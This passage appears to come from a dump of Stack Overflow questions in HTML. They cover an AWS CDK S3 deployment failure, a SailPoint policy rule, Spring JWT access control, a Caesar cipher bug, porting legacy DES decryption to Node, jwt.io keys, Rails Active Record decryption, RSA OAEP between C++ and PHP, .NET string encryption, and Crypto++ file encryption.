BaseWebsiteStack | 3/9 | 8:00:20 pm | CREATE_IN_PROGRESS   | AWS::S3::BucketPolicy       | RootDomainWebsite/Bucket/Policy (RootDomainWebsiteBucketPolicy7BE8379F)
BaseWebsiteStack | 3/9 | 8:00:20 pm | CREATE_IN_PROGRESS   | AWS::IAM::Policy            | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole/DefaultPolicy (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRoleDefaultPolicy88902FDF)
BaseWebsiteStack | 3/9 | 8:00:21 pm | CREATE_IN_PROGRESS   | AWS::IAM::Policy            | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole/DefaultPolicy (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRoleDefaultPolicy88902FDF) Resource creation Initiated
BaseWebsiteStack | 3/9 | 8:00:21 pm | CREATE_IN_PROGRESS   | AWS::S3::BucketPolicy       | RootDomainWebsite/Bucket/Policy (RootDomainWebsiteBucketPolicy7BE8379F) Resource creation Initiated
BaseWebsiteStack | 3/9 | 8:00:22 pm | CREATE_FAILED        | AWS::S3::BucketPolicy       | RootDomainWebsite/Bucket/Policy (RootDomainWebsiteBucketPolicy7BE8379F) Resource handler returned message: &quot;Access Denied (Service: S3, Status Code: 403, Request ID: R6GEEC9K5PB70TYH, Extended Request ID: AiOcFc3qNOLDSD1GLfsLWjeLwwugtjyH/m0R+KR2AOjJbLQ3Tk1V5Z+F05VzCLhctR+czwqCk5s=)&quot; (RequestToken: b111d11f-d2g2-5v42-e35h-12sdf845g21y, HandlerErrorCode: AccessDenied)
BaseWebsiteStack | 3/9 | 8:00:22 pm | CREATE_FAILED        | AWS::IAM::Policy            | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole/DefaultPolicy (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRoleDefaultPolicy88902FDF) Resource creation cancelled
BaseWebsiteStack | 3/9 | 8:00:22 pm | ROLLBACK_IN_PROGRESS | AWS::CloudFormation::Stack  | BaseWebsiteStack The following resource(s) failed to create: [CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRoleDefaultPolicy88902FDF, RootDomainWebsiteBucketPolicy7BE8379F]. Rollback requested by user.
BaseWebsiteStack | 3/9 | 8:00:25 pm | DELETE_IN_PROGRESS   | AWS::CDK::Metadata          | CDKMetadata/Default (CDKMetadata)
BaseWebsiteStack | 3/9 | 8:00:25 pm | DELETE_IN_PROGRESS   | AWS::IAM::Policy            | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole/DefaultPolicy (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRoleDefaultPolicy88902FDF)
BaseWebsiteStack | 3/9 | 8:00:25 pm | DELETE_IN_PROGRESS   | AWS::Lambda::LayerVersion   | RootDomainWebsite/BucketDeployment/AwsCliLayer (RootDomainWebsiteBucketDeploymentAwsCliLayerF90FDA26)
BaseWebsiteStack | 3/9 | 8:00:25 pm | DELETE_IN_PROGRESS   | AWS::S3::BucketPolicy       | RootDomainWebsite/Bucket/Policy (RootDomainWebsiteBucketPolicy7BE8379F)
BaseWebsiteStack | 4/9 | 8:00:26 pm | DELETE_COMPLETE      | AWS::IAM::Policy            | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole/DefaultPolicy (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRoleDefaultPolicy88902FDF)
BaseWebsiteStack | 3/9 | 8:00:26 pm | DELETE_COMPLETE      | AWS::CDK::Metadata          | CDKMetadata/Default (CDKMetadata)
BaseWebsiteStack | 4/9 | 8:00:26 pm | DELETE_COMPLETE      | AWS::S3::BucketPolicy       | RootDomainWebsite/Bucket/Policy (RootDomainWebsiteBucketPolicy7BE8379F)
BaseWebsiteStack | 3/9 | 8:00:26 pm | DELETE_COMPLETE      | AWS::Lambda::LayerVersion   | RootDomainWebsite/BucketDeployment/AwsCliLayer (RootDomainWebsiteBucketDeploymentAwsCliLayerF90FDA26)
BaseWebsiteStack | 2/9 | 8:00:39 pm | DELETE_COMPLETE      | AWS::IAM::Role              | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRole89A01265)
BaseWebsiteStack | 3/9 | 8:00:40 pm | ROLLBACK_COMPLETE    | AWS::CloudFormation::Stack  | BaseWebsiteStack

Failed resources:
BaseWebsiteStack | 8:00:22 pm | CREATE_FAILED        | AWS::S3::BucketPolicy       | RootDomainWebsite/Bucket/Policy (RootDomainWebsiteBucketPolicy7BE8379F) Resource handler returned message: &quot;Access Denied (Service: S3, Status Code: 403, Request ID: R6GEEC9K5PB70TYH, Extended Request ID: AiOcFc3qNOLDSD1GLfsLWjeLwwugtjyH/m0R+KR2AOjJbLQ3Tk1V5Z+F05VzCLhctR+czwqCk5s=)&quot; (RequestToken: b111d11f-d2g2-5v42-e35h-12sdf845g21y, HandlerErrorCode: AccessDenied)

 ❌  BaseWebsiteStack failed: Error: The stack named BaseWebsiteStack failed creation, it may need to be manually deleted from the AWS console: ROLLBACK_COMPLETE: Resource handler returned message: &quot;Access Denied (Service: S3, Status Code: 403, Request ID: R6GEEC9K5PB70TYH, Extended Request ID: AiOcFc3qNOLDSD1GLfsLWjeLwwugtjyH/m0R+KR2AOjJbLQ3Tk1V5Z+F05VzCLhctR+czwqCk5s=)&quot; (RequestToken: b111d11f-d2g2-5v42-e35h-12sdf845g21y, HandlerErrorCode: AccessDenied)
    at FullCloudFormationDeployment.monitorDeployment (C:\Users\omkar\AppData\Roaming\npm\node_modules\aws-cdk\lib\index.js:427:10615)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async Object.deployStack2 [as deployStack] (C:\Users\omkar\AppData\Roaming\npm\node_modules\aws-cdk\lib\index.js:430:196919)
    at async C:\Users\omkar\AppData\Roaming\npm\node_modules\aws-cdk\lib\index.js:430:178888

 ❌ Deployment failed: Error: The stack named BaseWebsiteStack failed creation, it may need to be manually deleted from the AWS console: ROLLBACK_COMPLETE: Resource handler returned message: &quot;Access Denied (Service: S3, Status Code: 403, Request ID: R6GEEC9K5PB70TYH, Extended Request ID: AiOcFc3qNOLDSD1GLfsLWjeLwwugtjyH/m0R+KR2AOjJbLQ3Tk1V5Z+F05VzCLhctR+czwqCk5s=)&quot; (RequestToken: b111d11f-d2g2-5v42-e35h-12sdf845g21y, HandlerErrorCode: AccessDenied)
    at FullCloudFormationDeployment.monitorDeployment (C:\Users\omkar\AppData\Roaming\npm\node_modules\aws-cdk\lib\index.js:427:10615)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async Object.deployStack2 [as deployStack] (C:\Users\omkar\AppData\Roaming\npm\node_modules\aws-cdk\lib\index.js:430:196919)
    at async C:\Users\omkar\AppData\Roaming\npm\node_modules\aws-cdk\lib\index.js:430:178888

The stack named BaseWebsiteStack failed creation, it may need to be manually deleted from the AWS console: ROLLBACK_COMPLETE: Resource handler returned message: &quot;Access Denied (Service: S3, Status Code: 403, Request ID: R6GEEC9K5PB70TYH, Extended Request ID: AiOcFc3qNOLDSD1GLfsLWjeLwwugtjyH/m0R+KR2AOjJbLQ3Tk1V5Z+F05VzCLhctR+czwqCk5s=)&quot; (RequestToken: b111d11f-d2g2-5v42-e35h-12sdf845g21y, HandlerErrorCode: AccessDenied)

D:\website\infra&gt;
</code></pre>
<p>I am using only following construct in my stack.</p>
<pre><code>import * as s3 from 'aws-cdk-lib/aws-s3';
import * as s3deploy from 'aws-cdk-lib/aws-s3-deployment';
import { RemovalPolicy } from 'aws-cdk-lib';
import { Construct } from 'constructs';

export interface S3WebsiteBucketProps {
bucketName: string;
indexDocument?: string;
errorDocument?: string;
websiteContentPath?: string;
}

export class S3WebsiteBucket extends Construct {
public readonly bucket: s3.Bucket;

constructor(scope: Construct, id: string, props: S3WebsiteBucketProps) {
super(scope, id);

// Create the S3 bucket
this.bucket = new s3.Bucket(this, 'Bucket', {
  bucketName: props.bucketName,
  websiteIndexDocument: props.indexDocument || 'index.html',
  websiteErrorDocument: props.errorDocument || props.indexDocument || 'error.html',
  publicReadAccess: true,
  removalPolicy: RemovalPolicy.DESTROY,
});

// Deploy the content to the bucket only when website content path is provided
if (props.websiteContentPath) {
  new s3deploy.BucketDeployment(this, 'BucketDeployment', {
    sources: [s3deploy.Source.asset(props.websiteContentPath)],
    destinationBucket: this.bucket,
  });
}
}
}
</code></pre>
<p>I have latest version of aws-cdk and have bootstrapped my environment with it. I have checked details of &quot;AdministrativeAccess&quot; Permission set which does not have any restrictions on my Identity Center User. I have created my aws account couple of months back. I had posted this question in aws re post but unsure how long will it take to get an answer over there.
I am expecting my stack gets deployed successfully from my local to my aws account using cdk deploy.</p>
"
"<p>I was trying this, and it works only if the &quot;username&quot; is contained on Traka, however if for instance &quot;adm_username&quot; is there, then ti wouldn't work.</p>
<p>I do not know whether this is even technically possible, since sailpoint seems to be grabbing the identity directly, each time it is iterating through a search.</p>
<pre><code>import sailpoint.object.*;
import java.util.*;
import java.text.*;


PolicyViolation polVil = null;

if (identity != null) {
    String identityName = identity.getName();

    // Check if the identity has the Traka application entitlement
    boolean hasTrakaEntitlement = false;
    List&lt;Link&gt; links = identity.getLinks();
    for (Link link : links) {
        if (link.getApplicationName().equalsIgnoreCase(&quot;Traka&quot;)) {
            hasTrakaEntitlement = true;
            break;
        }
    }
    
    // Check if the identity's department is not &quot;IAM&quot;
    boolean hasNonIAMDepartment = false;
    if (identity.getLinks() != null) {
        for (Link link : identity.getLinks()) {
            String department = (String) link.getAttribute(&quot;Department&quot;);
            if (department != null &amp;&amp; !department.equalsIgnoreCase(&quot;IAM&quot;)) {
                hasNonIAMDepartment = true;
                break;
            }
        }
    }

    // If the identity has the Traka application entitlement and non-IAM department, create a policy violation
    if (hasTrakaEntitlement &amp;&amp; hasNonIAMDepartment) {
        polVil = new PolicyViolation();
        polVil.setActive(true);
        polVil.setIdentity(identity);
        polVil.setPolicy(policy);
        polVil.setDescription(&quot;Identity has the Traka application entitlement and non-IAM department.&quot;);
    } else {

    }
}

return polVil;
</code></pre>
"
"<p>I have a spring boot project with JWT being used for Spring Security. I want to implement Access Management in my project and I'm using this approach. In my project, whenever a user is created, a list of Departments is assigned to to the user. The user should be able to view and edit data that is related to the departments that have been assigned to them. I have implemented this using the below code, where the class &quot;Department&quot; is the Master data. A list of &quot;assigned&quot; Departments is associated with each User.</p>
<pre><code>public class User implements UserDetails {
  private static final long serialVersionUID = 1L;
  @Id
  @GeneratedValue(strategy = GenerationType.UUID)
  private UUID id;

  private String username;

  private String password;

  @JsonManagedReference
  @OneToMany(cascade = CascadeType.ALL, mappedBy = &quot;user&quot;, fetch = FetchType.EAGER)
  private List&lt;AssignedDepartment&gt; assignedDepartmentList = new ArrayList&lt;&gt;();

  public void setAssignedDepartment(List&lt;AssignedDepartment&gt; assignedDepartmentList1) {
    for(AssignedDepartment assignedDepartment : assignedDepartmentList1) {
      assignedDepartment.setUser(this);
      this.assignedDepartmentList.add(assignedDepartment);
    }
  }
}
</code></pre>
<pre><code>public class AssignedDepartment {
    @Id
    @GeneratedValue(strategy= GenerationType.IDENTITY)
    private Integer id;

    @JsonBackReference
    @ManyToOne
    @JoinColumn(name = &quot;username&quot;, referencedColumnName = &quot;username&quot;, nullable = false)
    private User user;

    @ManyToOne
    @JoinColumn(name = &quot;department_code&quot;, referencedColumnName = &quot;departmentCode&quot;)
    private Department department;
}
</code></pre>
<pre><code>public class Department implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    private String departmentCode;

    private String departmentName;
}
</code></pre>
<p>Considering the above implementation and approach and the below code, where I'm getting the list of assigned Departments from the JWT token (passed as a Bearer token) that is passed in the API request, is my implementation correct and safe? <strong>The below function is called every time any API is getting hit</strong>. I have tested the code and it works fine. The list of departments is always being fetched correctly based on the JWT token that I sent in the API request. I just want to confirm if there are any issues that might arise from this approach.</p>
<pre><code>private List&lt;String&gt; getListOfDepartmentsAssignedToCurrentUser() throws Exception {
    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();

    if(authentication == null || !authentication.isAuthenticated()) {
        throw new Exception(&quot;Unable to get departments for current user with authentication details: &quot; + authentication);
    }

    try {
        List&lt;AssignedDepartment&gt; userAssignedDepartments = ((User) authentication.getPrincipal()).getUserAssignedDepartments();
        return userAssignedDepartments.stream()
                .map(m -&gt; m.getDepartment().getDepartmentCode())
                .collect(Collectors.toList());
    } catch (Exception e) {
        throw new Exception(&quot;Error while streaming departments for current user with Exception: &quot; + e.toString());
    }
}
</code></pre>
"
"<p>I'm working on a Caesar Cipher, but running into big issues with the encryption portion!</p>
<p>My code:</p>
<pre><code>direction = input(&quot;Type 'encode' to encrypt, type 'decode' to decrypt:\n&quot;)
text = input(&quot;Type your message:\n&quot;).lower()
shift = int(input(&quot;Type the shift number:\n&quot;))

message = []
def caesar(text, shift):
  message = list(text)
  if shift &gt; 26:
    shift = shift % 26
  for i in message:
    if i in alphabet:
      position = message.index(i)
      location = alphabet.index(i)
      if direction == &quot;decode&quot;:
        shift = shift * -1
      newlet = alphabet[location + shift] 
      message.insert(position,newlet)
      message.remove(i)
      print(message)
</code></pre>
<p>The teacher's correct code:</p>
<pre><code>direction = input(&quot;Type 'encode' to encrypt, type 'decode' to decrypt:\n&quot;)
text = input(&quot;Type your message:\n&quot;).lower()
shift = int(input(&quot;Type the shift number:\n&quot;))

def caesar(text, shift):
  end_text = &quot;&quot;
  if direction == &quot;decode&quot;:
    shift *= -1
  for char in text:
    if char in alphabet:
      position = alphabet.index(char)
      new_position = position + shift
      end_text += alphabet[new_position]
    else:
      end_text += char
  print(f&quot;Here's the {direction}d result: {end_text}&quot;)
</code></pre>
<p>For example, when the teacher's text input is: &quot;Taylor Swift&quot; with a shift input of 4, it comes out as &quot;xecpsv wamjx&quot; but mine comes out as &quot;xecpav swmjx&quot;.</p>
<p>I've tried switching out various things, but I'd just like to understand what's going wrong and why the glitches are so sporadic- sometimes it works just fine for shorter inputs like &quot;two one&quot; but not longer ones like &quot;civilization&quot; or the other way around. Very confusing!</p>
<p>I'll add below an example of the program running output: I made it print the position (the individual numbers) and the message (list) every loop run so I could see what was going on - the position is messed up, and so is the message.</p>
<pre><code>Type 'encode' to encrypt, type 'decode' to decrypt:
encode
Type your message:
taylor swift
Type the shift number:
4
0
['x', 'a', 'y', 'l', 'o', 'r', ' ', 's', 'w', 'i', 'f', 't']
1
['x', 'e', 'y', 'l', 'o', 'r', ' ', 's', 'w', 'i', 'f', 't']
2
['x', 'e', 'c', 'l', 'o', 'r', ' ', 's', 'w', 'i', 'f', 't']
3
['x', 'e', 'c', 'p', 'o', 'r', ' ', 's', 'w', 'i', 'f', 't']
4
['x', 'e', 'c', 'p', 's', 'r', ' ', 's', 'w', 'i', 'f', 't']
5
['x', 'e', 'c', 'p', 's', 'v', ' ', 's', 'w', 'i', 'f', 't']
4
['x', 'e', 'c', 'p', 'w', 'v', ' ', 's', 'w', 'i', 'f', 't']
4
['x', 'e', 'c', 'p', 'a', 'v', ' ', 's', 'w', 'i', 'f', 't']
9
['x', 'e', 'c', 'p', 'a', 'v', ' ', 's', 'w', 'm', 'f', 't']
10
['x', 'e', 'c', 'p', 'a', 'v', ' ', 's', 'w', 'm', 'j', 't']
11
['x', 'e', 'c', 'p', 'a', 'v', ' ', 's', 'w', 'm', 'j', 'x']
The encoded text is xecpav swmjx
</code></pre>
"
"<p>I'm trying to decrypt a legacy database with NodeJS, but without success. The code was initially written in Java.</p>
<p><strong>EDITED</strong></p>
<p>The Java source code to encrypt data.</p>
<pre><code>import java.util.*;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.SecretKey;
import javax.crypto.spec.DESKeySpec;
import java.util.Base64;

public class Main {
    public static void main(String[] args) {

        String encrypted = &quot;&quot;;
      
        String secretCredentials = &quot;abcdefghijklmnop&quot;;

        String plainText = &quot;Text to encrypt!&quot;;
      
        String charset = StandardCharsets.UTF_8;

        String strategy = &quot;DES&quot;;
      
        try {
        
            byte[] secretCredentialsBytes = secretCredentials.getBytes(charset);
        
            SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(strategy);
        
            SecretKey secretKey = secretKeyFactory.generateSecret(new DESKeySpec(secretCredentialsBytes));
        
            Cipher cipher = Cipher.getInstance(strategy);
            
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            
            byte[] plainTextBytes = plainText.getBytes(charset);
              
            byte[] outputBytes = cipher.doFinal(plainTextBytes);
        
            byte[] encryptedTextBytes = Base64.getEncoder().encode(outputBytes);
  
            encryptedText = new String(encryptedTextBytes);
            
            System.out.println(encryptedText); //=&gt; AIGBXYEWXz5w2Z3Fjqe5YiQbyR5eVbPW
          
        } catch (Exception e) {
            e.printStackTrace();
        }
      
    }
}
</code></pre>
<p>The NodeJS source code to decrypt data:</p>
<pre class=""lang-js prettyprint-override""><code>const {
  createDecipheriv
} = await import('crypto');

const encrypted = 'AIGBXYEWXz5w2Z3Fjqe5YiQbyR5eVbPW';

const charset = 'utf-8';

const encryptedAsBuffer = Buffer.from(encrypted, 'base64');

const secretCredentials = 'abcdefghijklmnop';

let credentialsAsBuffer  = Buffer.from(secretCredentials, charset);

const strategy = 'des-ede-cbc';

const iv = credentialsAsBuffer.subarray(credentialsAsBuffer.length - (credentialsAsBuffer.length - 8));

const decipher = createDecipheriv(strategy, credentialsAsBuffer, iv);

let decrypted = decipher.update(encryptedAsBuffer, 'base64', charset);
decrypted += decipher.final(charset);

console.log(decrypted);
</code></pre>
<p>But an error is returning...</p>
<pre><code>node:internal/crypto/cipher:193
  const ret = this[kHandle].final();
                            ^

Error: error:1C800064:Provider routines::bad decrypt
    at Decipheriv.final (node:internal/crypto/cipher:193:29)
    at file:///... {
  library: 'Provider routines',
  reason: 'bad decrypt',
  code: 'ERR_OSSL_BAD_DECRYPT'
}

Node.js v20.11.0
</code></pre>
<p>I know that was encountered vulnerabilities on &quot;DES&quot; algorithm, but it's a legacy system.</p>
"
"<p>I have a slight confusion regarding the online JWT validator <code>jwt.io</code>. As far as I understand, a JWT that is signed with the <code>RS256</code> algorithm is signed with a private key, and all is needed to verify it is the corresponding public key.</p>
<p>If so, why is it that <code>jwt.io</code> lets you fill in the private key part?</p>
<p><a href=""https://i.stack.imgur.com/bwkIJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bwkIJ.png"" alt=""enter image description here"" /></a></p>
"
"<p>I have a Rails application with a table named &quot;orders&quot; containing encrypted fields. The encryption is handled by Rails 7's built-in Active Record Encryption feature.</p>
<p>I'm attempting to write a Ruby lambda function outside of the Rails application to decrypt the encrypted data. I've ensured that I'm using the same encryption key as in my Rails app, but decryption is unsuccessful.</p>
<p>Could you help me troubleshoot and resolve this decryption issue?</p>
<p>I tried in plain ruby but my code is giving error.
My code as follows</p>
<p>lambada_function.rb</p>
<pre><code>
require 'active_support/all'

require 'active_record'
require_relative 'application'
require_relative './models/order'
require 'pry'

last_order = Order.last

ActiveRecord::Encryption::Encryptor.new.decrypt(last_order.user_surname)
</code></pre>
<p>application.rb</p>
<pre><code># frozen_string_literal: true

require 'active_record'
require 'tzinfo'

class Application
  env_file = File.join('./config_env.yml')
  YAML.safe_load(File.open(env_file), aliases: true).each do |key, value|
    ENV[key.to_s] = value
  end

  db_configuration_file_path = './db/database.yml'
  db_configuration = YAML.safe_load(File.read(db_configuration_file_path), aliases: true)

  ActiveRecord::Base.establish_connection(db_configuration['production'])
  tz = TZInfo::Timezone.get('Asia/Tokyo')
  Time.zone = tz

  ActiveRecord.default_timezone = :local
  ActiveRecord::Encryption.configure(
    primary_key: ENV['PRIMARY_KEY'],
    deterministic_key: ENV['DETERMINISTIC_KEY'],
    key_derivation_salt: ENV['KEY_DERIVATION_SALT'],
    support_unencrypted_data: true
  )
end

</code></pre>
<p>order.rb</p>
<pre><code>class Order &lt; ActiveRecord::Base
  # encrypt user information
  encrypts :user_name, deterministic: true
end
</code></pre>
<p>Error:</p>
<pre><code>/Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/encryptor.rb:58:in `rescue in decrypt': ActiveRecord::Encryption::Errors::Decryption (ActiveRecord::Encryption::Errors::Decryption)
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/encryptor.rb:52:in `decrypt'
    from lambda_function.rb:10:in `&lt;main&gt;'
/Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher/aes256_gcm.rb:80:in `rescue in decrypt': ActiveRecord::Encryption::Errors::Decryption (ActiveRecord::Encryption::Errors::Decryption)
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher/aes256_gcm.rb:56:in `decrypt'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:42:in `block in try_to_decrypt_with_each'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:41:in `each'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:41:in `with_index'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:41:in `try_to_decrypt_with_each'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:26:in `decrypt'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/encryptor.rb:56:in `decrypt'
    from lambda_function.rb:10:in `&lt;main&gt;'
/Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher/aes256_gcm.rb:76:in `final': OpenSSL::Cipher::CipherError
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher/aes256_gcm.rb:76:in `decrypt'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:42:in `block in try_to_decrypt_with_each'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:41:in `each'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:41:in `with_index'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:41:in `try_to_decrypt_with_each'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/cipher.rb:26:in `decrypt'
    from /Users/vebuinuser/Documents/Belc/ruby_lambada/ruby/3.2.0/gems/activerecord-7.0.4/lib/active_record/encryption/encryptor.rb:56:in `decrypt'
    from lambda_function.rb:10:in `&lt;main&gt;'
</code></pre>
"
"<p>I've been working on implementing end-to-end encryption for my C++ client and server using OpenSSL. To accomplish this, I've created a PHP script that generates a public-private key pair. The script saves the client's key in a .pem file and echoes back the server's public key to the client. So far, this process works smoothly. I'm able to encrypt a string using the server's public key without any issues.</p>
<p>However, I encounter a problem when attempting to decrypt the encrypted message on the server side. I've developed a simple PHP script for decryption, but it returns OpenSSL errors, specifically: OpenSSL Error: error:04099079:rsa routines:RSA_padding_check_PKCS1_OAEP_mgf1:oaep decoding error</p>
<p>I've tried to debug by checking if any data changes during transmission between the client and the server, but haven't found any discrepancies.</p>
<p>I'm at a loss and would greatly appreciate any assistance or insights into resolving this issue. Thank you.</p>
<p>code:</p>
<pre class=""lang-c++ prettyprint-override""><code>int main() {
    // create gui.
    menu::create_h_window(&quot;test window&quot;);
    menu::create_device();
    menu::create_imgui();

    // exchange keys.
    key_exchange exchanger;
    exchanger.exchange_keys();

    std::string test_message = &quot;This is a test message&quot;;
    std::string encrypted_message = exchanger.encrypt_message(test_message, exchanger.server_public_key);

    curl_request request;
    CURL* curl = curl_easy_init();
    char* encoded_message = curl_easy_escape(curl, exchanger.base64_encode(encrypted_message).c_str(), 0);
    std::string post_fields = &quot;message=&quot; + std::string(encoded_message);
    curl_free(encoded_message);
    std::string server_response = request.post_request(&quot;https://example.org/test_encryption.php&quot;, post_fields);

    while (menu::b_is_running) {
        menu::begin_render();
        menu::render();
        menu::end_render();

        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }

    // destroy gui.
    menu::destroy_imgui();
    menu::destroy_device();
    menu::destroy_h_window();

    return 0;
}
</code></pre>
<pre class=""lang-php prettyprint-override""><code>&lt;?php
    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    if (!isset($_POST['message'])) {
        echo &quot;Error: Message not received&quot;;
        exit;
    }

    if (!file_exists('server_private_key.pem')) {
        echo &quot;Error: Private key file not found&quot;;
        exit;
    }

    $private_key = file_get_contents('server_private_key.pem');

    if (!$private_key) {
        echo &quot;Error: Invalid private key&quot;;
        exit;
    }
    $encrypted_message = base64_decode($_POST['message']);

    if (!openssl_private_decrypt($encrypted_message, $decrypted_message, $private_key, OPENSSL_PKCS1_OAEP_PADDING)) {
        while ($msg = openssl_error_string()) {
            echo &quot;OpenSSL Error: &quot; . $msg . &quot;\n&quot;;
        }
        exit;
    }
    echo $decrypted_message;
?&gt;
</code></pre>
<pre class=""lang-c++ prettyprint-override""><code>std::string encrypt_message(const std::string&amp; message, const std::string&amp; other_public_key) {
    BIO* bio = BIO_new_mem_buf(other_public_key.data(), other_public_key.size());
    EVP_PKEY* evp_pkey = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
    if (evp_pkey == nullptr) {
        unsigned long err = ERR_get_error();
        char* err_str = ERR_error_string(err, NULL);
        std::cout &lt;&lt; &quot;Error: &quot; &lt;&lt; err_str &lt;&lt; std::endl;
    }

    RSA* other_rsa = EVP_PKEY_get1_RSA(evp_pkey);
    BIO_free(bio);
    int rsa_size = RSA_size(other_rsa);
    unsigned char* encrypted = new unsigned char[rsa_size];
    int encrypted_len = RSA_public_encrypt(message.size(), reinterpret_cast&lt;const unsigned char*&gt;(message.data()), encrypted, other_rsa, RSA_PKCS1_OAEP_PADDING);
    std::string encrypted_str(reinterpret_cast&lt;char*&gt;(encrypted), encrypted_len);
    delete[] encrypted;
    RSA_free(other_rsa);
    EVP_PKEY_free(evp_pkey);
    return encrypted_str;
}
</code></pre>
"
"<p>I looked it up, googled it, and tried a few methods.
But it seems these methods mostly work for Windows C# application and will fail when I call it on Android for example:</p>
<pre><code>using System.Security.Cryptography;
public string Encrypt(string plainText, string? password = null)
{
    var data = Encoding.Default.GetBytes(plainText);
    var pwd = !string.IsNullOrEmpty(password) ? Encoding.Default.GetBytes(password) : Array.Empty&lt;byte&gt;();
    var cipher = ProtectedData.Protect(data, pwd, DataProtectionScope.CurrentUser);
    return Convert.ToBase64String(cipher);
}

public string Decrypt(string cipherText, string? password = null)
{
    var cipher = Convert.FromBase64String(cipherText);
    var pwd = !string.IsNullOrEmpty(password) ? Encoding.Default.GetBytes(password) : Array.Empty&lt;byte&gt;();
    var data = ProtectedData.Unprotect(cipher, pwd, DataProtectionScope.CurrentUser);
    return Encoding.Default.GetString(data);
}
</code></pre>
<p>What I need is something simple just to Encrypt/Decrypt a string like Password. Or something safe to store strings for Android/Windows/IOS.</p>
<p>I have read through the SecureStorage documentation but it seems quite complicated compared to just implementing the 2 Encrypt/Decrypt Functions that I often use on NetFramework Windows Form. Then I just call the Function and use it.</p>
"
"<p>I am trying to decrypt an encrypted file Using the Crypto++ Library. The encryption seems to work perfectly as the file that I am encrypting has Cipher text when I open it. However , just in case I will give my encryption code should it be useful.</p>
<p>Here is my Encryption Code:</p>
<pre><code>    bool Cipher::encryptFile(const char* inputFileName, const char* outputFileName)
    {

    salt = generateRandomSalt();
    generateRandomIV();

    
    if (!deriveKeyFromPassword(storedPassword, strlen(storedPassword), salt))
    {
        cerr &lt;&lt; &quot;Key derivation failed&quot; &lt;&lt; endl;
        return false;
    }

    if (iv.size() == 0 || key.size() == 0)
    {
        cerr &lt;&lt; &quot;Failed to generate IV&quot; &lt;&lt; endl;
    }

    try
    {
        ofstream outputFile(outputFileName, ios::binary | ios::trunc);
        ifstream inputFile(inputFileName, ios::binary);                                 //Input / Output files for       actual encryption
        

        if (!inputFile.is_open() || !outputFile.is_open())
        {
            cerr &lt;&lt; &quot;Error opening files&quot; &lt;&lt; endl;
            return false;
        }

        outputFile.write(reinterpret_cast&lt;const char*&gt;(salt.data()), salt.size());    //IV and salt saved to output file
        outputFile.write(reinterpret_cast&lt;const char*&gt;(iv.data()), iv.size());

        //Show Salt and IV
        cerr &lt;&lt; &quot;Read salt: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(salt.data()), salt.size(), true, new   HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        cerr &lt;&lt; &quot;Read IV: &quot;;
